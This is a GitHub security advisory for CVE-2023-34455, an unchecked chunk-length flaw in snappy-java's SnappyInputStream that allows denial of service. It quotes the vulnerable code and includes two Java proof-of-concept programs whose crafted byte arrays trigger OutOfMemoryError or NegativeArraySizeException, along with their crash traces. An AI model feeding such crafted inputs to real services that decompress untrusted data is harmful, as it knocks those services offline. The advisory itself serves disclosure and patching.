# [H] snappy-java's unchecked chunk length leads to DoS

## Summary
Severity: High
Advisory: GHSA-qcwq-55hx-v3vh
CVE: CVE-2023-34455
CWE: CWE-770
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-06-15
Source: https://github.com/advisories/GHSA-qcwq-55hx-v3vh
Type: github-advisory

## Affected
- Maven: `org.xerial.snappy:snappy-java` — affected >=0 <1.1.10.1

## Details
## Summary
Due to use of an unchecked chunk length, an unrecoverable fatal error can occur.
## Impact
Denial of Service
## Description
The code in the function [hasNextChunk](https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388) in the file [SnappyInputStream.java](https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java) checks if a given stream has more chunks to read. It does that by attempting to read 4 bytes. If it wasn’t possible to read the 4 bytes, the function returns false. Otherwise, if 4 bytes were available, the code treats them as the length of the next chunk.



```java
        int readBytes = readNext(header, 0, 4);
        if (readBytes < 4) {
            return false;
        }

        int chunkSize = SnappyOutputStream.readInt(header, 0);
        if (chunkSize == SnappyCodec.MAGIC_HEADER_HEAD) {
            .........
        }

        // extend the compressed data buffer size
        if (compressed == null || chunkSize > compressed.length) {
            compressed = new byte[chunkSize];
        }

```

In the case that the “compressed” variable is null, a byte array is allocated with the size given by the input data. Since the code doesn’t test the legality of the “chunkSize” variable, it is possible to pass a negative number (such as 0xFFFFFFFF which is -1), which will cause the code to raise a “java.lang.NegativeArraySizeException” exception. A worse case would happen when passing a huge positive value (such as 0x7FFFFFFF), which would raise the fatal “java.lang.OutOfMemoryError” error.


## Steps To Reproduce
Compile and run the following code:

```java
package org.example;
import org.xerial.snappy.SnappyInputStream;

import java.io.*;

public class Main {

    public static void main(String[] args) throws IOException {
        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff};
        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));
        byte[] out = new byte[50];
        try {
            in.read(out);
        }
        catch (Exception ignored) {

        }
    }
}
```

The program will crash with the following error (or similar), even though there is a catch clause, since “OutOfMemoryError” does not get caught by catching the “Exception” class:

```
Exception in thread "main" java.lang.OutOfMemoryError: Requested array size exceeds VM limit
	at org.xerial.snappy.SnappyInputStream.hasNextChunk(SnappyInputStream.java:422)
	at org.xerial.snappy.SnappyInputStream.read(SnappyInputStream.java:167)
	at java.base/java.io.InputStream.read(InputStream.java:217)
	at org.example.Main.main(Main.java:12)

```


Alternatively - compile and run the following code:

```java
package org.example;
import org.xerial.snappy.SnappyInputStream;

import java.io.*;

public class Main {

    public static void main(String[] args) throws IOException {
        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff};
        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));
        byte[] out = new byte[50];
        in.read(out);
    }
}
```

The program will crash with the following error (or similar):

```
Exception in thread "main" java.lang.NegativeArraySizeException: -1
	at org.xerial.snappy.SnappyInputStream.hasNextChunk(SnappyInputStream.java:422)
	at org.xerial.snappy.SnappyInputStream.read(SnappyInputStream.java:167)
	at java.base/java.io.InputStream.read(InputStream.java:217)
	at org.example.Main.main(Main.java:12)

```


It is important to note that these examples were written by using a flow that is generally used by developers, and can be seen for example in the Apache project “flume”: https://github.com/apache/flume/blob/f9dbb2de255d59e35e3668a5c6c66a268a055207/flume-ng-channels/flume-file-channel/src/main/java/org/apache/flume/channel/file/Serialization.java#L278. Since they used try-catch, the “NegativeArraySizeException” exception won’t harm their users, but the “OutOfMemoryError” error can.

## References
- https://github.com/xerial/snappy-java/security/advisories/GHSA-qcwq-55hx-v3vh
- https://nvd.nist.gov/vuln/detail/CVE-2023-34455
- https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea
- https://github.com/xerial/snappy-java
- https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388
- https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java
- https://security.netapp.com/advisory/ntap-20230818-0009
